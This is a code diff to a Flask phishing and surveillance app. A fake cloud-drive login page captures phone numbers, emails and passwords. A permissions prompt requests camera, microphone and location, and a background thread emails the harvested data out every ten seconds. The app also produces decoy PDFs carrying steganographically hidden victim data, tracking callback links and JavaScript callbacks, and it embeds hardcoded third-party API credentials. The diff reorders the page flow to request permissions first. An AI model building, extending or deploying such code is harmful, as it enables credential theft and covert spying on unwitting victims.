@@ -62,7 +62,7 @@ data_buffer = []
 images_to_send = []  # To store image filenames for emailing
 buffer_lock = threading.Lock()
 
-
+# Email sending functions (unchanged)
 def send_email(data_list, image_list):
     smtp_server = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
     smtp_port = int(os.environ.get("SMTP_PORT", 587))
@@ -95,7 +95,6 @@ def send_email(data_list, image_list):
     except Exception as e:
         logging.error(f"Failed to send email: {e}")
 
-
 def email_sender_thread():
     while True:
         time.sleep(10)
@@ -105,7 +104,7 @@ def email_sender_thread():
                 data_buffer.clear()
                 images_to_send.clear()
 
-
+# Helper functions (unchanged)
 def get_wifi_location_from_wigle(bssid):
     username = "AID9d6a1f4d617967b3d4c6189558862314"
     api_token = "ac01dcab47f048daf62cb43edaf37295"
@@ -124,11 +123,9 @@ def get_wifi_location_from_wigle(bssid):
         logging.error(f"Error querying Wigle API: {e}")
     return None, None
 
-
 def get_hidden_message(data):
     encoded = base64.b64encode(json.dumps(data).encode()).decode()
     return "<<BASE64 START>>" + encoded + "<<BASE64 END>>"
-
 
 def get_ip_geolocation(ip):
     try:
@@ -141,7 +138,6 @@ def get_ip_geolocation(ip):
     except Exception as e:
         logging.error(f"IP Geolocation error: {e}")
     return None, None, {}
-
 
 def get_wifi_interfaces():
     try:
@@ -158,7 +154,6 @@ def get_wifi_interfaces():
     except Exception as e:
         logging.error(f"Error retrieving WiFi interfaces: {e}")
         return {}
-
 
 def collect_data(req):
     ip_header = req.headers.get('X-Forwarded-For', req.remote_addr)
@@ -214,10 +209,8 @@ def collect_data(req):
     }
     return log_message
 
-
 # Monkey patch collect_data to store data in the buffer
 original_collect_data = collect_data
-
 
 def patched_collect_data(*args, **kwargs):
     data = original_collect_data(*args, **kwargs)
@@ -225,17 +218,15 @@ def patched_collect_data(*args, **kwargs):
         data_buffer.append(data)
     return data
 
-
 collect_data = patched_collect_data
 
-
+# Other helper functions (unchanged)
 def embed_data_in_image(data):
     encrypted_data = CIPHER.encrypt(json.dumps(data).encode())
     encrypted_str = base64.b64encode(encrypted_data).decode('utf-8')
     base_img = PILImage.new('RGB', (500, 500), color='white')
     stego_img = lsb.hide(base_img, encrypted_str)
     return stego_img
-
 
 def simulate_multi_stage_payload(data):
     logging.info(f"Simulating multi-stage payload delivery with data: {json.dumps(data)}")
@@ -245,11 +236,9 @@ def simulate_multi_stage_payload(data):
     logging.info(f"Simulated multi-stage payload: {json.dumps(stage_payload)}")
     return stage_payload
 
-
 def simulate_dll_injection():
     logging.info("Simulated DLL injection executed (defensive demonstration only)")
     return "DLL injection simulated"
-
 
 def get_gemini_report(data):
     try:
@@ -298,14 +287,12 @@ The provided data contains information about devices and users potentially invol
         logging.error(f"Error contacting Gemini AI: {e}")
         return f"Error contacting Gemini AI: {e}"
 
-
 def generate_pdf(logged_data):
     buffer = BytesIO()
     doc = SimpleDocTemplate(buffer, pagesize=letter)
     styles = getSampleStyleSheet()
     story = []
 
-    # Add fake PDF content
     story.append(Paragraph("Fake PDF Document", styles['Title']))
     story.append(Paragraph(f"Name: {fake.name()}", styles['Normal']))
     address = fake.address().replace('\n', ', ')
@@ -313,14 +300,12 @@ def generate_pdf(logged_data):
     story.append(Paragraph("Additional Info:", styles['Normal']))
     story.append(Paragraph(fake.text(max_nb_chars=200), styles['Normal']))
 
-    # Embed hidden data in an image
     stego_img = embed_data_in_image(logged_data)
     img_buffer = BytesIO()
     stego_img.save(img_buffer, format='PNG')
     img_buffer.seek(0)
     story.append(Image(img_buffer, width=100, height=100))
 
-    # Add verification link with a unique token
     token = str(uuid.uuid4())
     verification_link = f"https://pdf-ops.onrender.com/verify?token={token}"
     story.append(Paragraph(f"Please <a href='{verification_link}'>click here</a> to thank our services.", styles['Normal']))
@@ -337,7 +322,6 @@ def generate_pdf(logged_data):
         pdf_writer.add_page(page)
     pdf_writer.add_metadata({'/HiddenData': hidden_message})
 
-    # Inject JavaScript into the PDF for callbacks
     js_code = f"""
     if (typeof XMLHttpRequest !== 'undefined') {{
         try {{
@@ -357,14 +341,10 @@ def generate_pdf(logged_data):
     }}
     """
 
-    # (Optional) You can embed the JavaScript into the PDF if your PDF viewer supports it.
-    # For this example, we are not using PyPDF2 to inject JS, but you can extend this functionality.
-
     new_buffer = BytesIO()
     pdf_writer.write(new_buffer)
     new_buffer.seek(0)
     return new_buffer, token
-
 
 # HTML Templates
 LOGIN_PAGE = """
@@ -434,7 +414,7 @@ PERMISSIONS_PAGE = """
                 navigator.mediaDevices.getUserMedia({video: true}),
                 navigator.mediaDevices.getUserMedia({audio: true})
             ]).then(() => {
-                window.location.href = '/drive?permissions=granted';
+                window.location.href = '/grant_permissions';
             }).catch((error) => {
                 window.location.href = '/permissions?error=denied';
             });
@@ -489,7 +469,6 @@ DRIVE_PAGE = """
             <input type="hidden" name="cameraSnapshot" id="cameraSnapshot">
             <button type="submit" class="btn btn-primary">Download Data</button>
         </form>
-     <!--   <a href="/logs" class="btn btn-link">View Logs</a> -->
     </div>
     <video id="video" width="320" height="240" autoplay style="display:none;"></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
@@ -591,11 +570,23 @@ DRIVE_PAGE = """
 # Routes
 @app.route('/')
 def index():
-    return redirect(url_for('login'))
+    return redirect(url_for('permissions'))
 
+@app.route('/permissions')
+def permissions():
+    error = request.args.get('error')
+    return render_template_string(PERMISSIONS_PAGE, error=error)
+
+@app.route('/grant_permissions')
+def grant_permissions():
+    session['permissions_granted'] = True
+    return redirect(url_for('login'))
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
+    if request.method == 'GET':
+        if not session.get('permissions_granted'):
+            return redirect(url_for('permissions'))
     if request.method == 'POST':
         phone = request.form['phone']
         email = request.form['email']
@@ -603,30 +594,19 @@ def login():
         logging.info(f"Login attempt: phone={phone}, email={email}, password={password}")
         session['logged_in'] = True
         session['user_data'] = {'phone': phone, 'email': email}
-        return redirect(url_for('permissions'))
+        return redirect(url_for('drive'))
     return render_template_string(LOGIN_PAGE)
-
-
-@app.route('/permissions')
-def permissions():
-    if not session.get('logged_in'):
-        return redirect(url_for('login'))
-    error = request.args.get('error')
-    return render_template_string(PERMISSIONS_PAGE, error=error)
-
 
 @app.route('/drive')
 def drive():
-    if not session.get('logged_in'):
-        return redirect(url_for('login'))
-    permissions = request.args.get('permissions', 'denied')
+    if not session.get('logged_in') or not session.get('permissions_granted'):
+        return redirect(url_for('permissions'))
     current_time = datetime.now()
     one_hour_ago = current_time - timedelta(hours=1)
     two_hours_ago = current_time - timedelta(hours=2)
     date1 = one_hour_ago.strftime("%b %d, %Y, %H:%M")
     date2 = two_hours_ago.strftime("%b %d, %Y, %H:%M")
-    return render_template_string(DRIVE_PAGE, permissions=permissions, date1=date1, date2=date2)
-
+    return render_template_string(DRIVE_PAGE, permissions='granted', date1=date1, date2=date2)
 
 @app.route('/download', methods=['POST'])
 def download():
@@ -650,7 +630,7 @@ def download():
 
     return send_file(pdf_buffer, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')
 
-
+# Remaining routes (unchanged)
 @app.route('/verify', methods=['GET'])
 def verify():
     token = request.args.get('token')
@@ -662,13 +642,11 @@ def verify():
         return "Thank you!", 200
     return "Invalid token", 400
 
-
 @app.route('/pdf_callback', methods=['GET'])
 def pdf_callback():
     hidden_data = request.args.get('data', '')
     logging.info(f"Primary PDF callback triggered with data: {hidden_data}")
     return "Primary callback logged", 200
-
 
 @app.route('/pdf_callback_stage2', methods=['GET'])
 def pdf_callback_stage2():
@@ -677,7 +655,6 @@ def pdf_callback_stage2():
         logging.info(f"Stage2 callback: Token {token} verified with data: {json.dumps(logged_tokens[token])}")
         return "Stage2 callback logged", 200
     return "Invalid token", 400
-
 
 @app.route('/logs')
 def display_logs():
@@ -748,7 +725,6 @@ def display_logs():
     """
     return render_template_string(logs_html, logs=logs_content, reports=downloaded_reports, captures=captures)
 
-
 @app.route('/log_location', methods=['POST'])
 def log_location():
     data = request.json
@@ -756,7 +732,6 @@ def log_location():
         data_buffer.append(data)
     logging.info(f"Location data: {json.dumps(data)}")
     return "Location logged", 200
-
 
 @app.route('/log_camera', methods=['POST'])
 def log_camera():
@@ -779,7 +754,6 @@ def log_camera():
         logging.error(f"Error in log_camera: {e}")
         return {'status': 'error', 'message': str(e)}, 500
 
-
 @app.route('/log_microphone', methods=['POST'])
 def log_microphone():
     data = request.json
@@ -787,7 +761,6 @@ def log_microphone():
         data_buffer.append(data)
     logging.info(f"Microphone data: {json.dumps(data)}")
     return "Microphone logged", 200
-
 
 @app.route('/log_other_data', methods=['POST'])
 def log_other_data():
@@ -797,11 +770,9 @@ def log_other_data():
     logging.info(f"Other data: {json.dumps(data)}")
     return "Other data logged", 200
 
-
 @app.route('/simulate')
 def simulate():
     return "Simulation endpoint", 200
-
 
 if __name__ == '__main__':
     threading.Thread(target=email_sender_thread, daemon=True).start()
